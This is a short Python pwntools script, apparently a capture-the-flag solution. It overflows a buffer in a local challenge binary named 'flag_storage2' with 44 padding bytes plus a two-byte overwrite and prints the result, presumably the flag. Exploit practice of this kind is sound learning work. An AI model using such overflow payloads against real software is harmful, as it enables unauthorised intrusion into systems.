#!/usr/bin/env python

from pwn import *

payload = b"\xA9\xF1"

proc = process("flag_storage2")
proc.sendline('A'*44 + payload)

proc.recvuntil(':\n')
print proc.recvall()
proc.close()

